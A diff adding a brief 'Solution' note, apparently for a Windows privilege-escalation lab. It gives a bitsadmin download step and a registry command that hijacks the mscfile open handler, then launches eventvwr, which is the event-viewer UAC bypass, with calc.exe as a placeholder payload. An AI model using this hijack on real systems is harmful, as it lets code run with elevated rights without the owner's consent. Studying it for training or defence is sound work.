@@ -1,0 +1,9 @@
+Solution:
+
+Download file using bitsadmin binary
+
+Register Payload as Combonent Object for event viewer
+reg add HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command /d "C:\\Windows\\System32\\calc.exe" /f
+
+Run Command:
+eventvwr
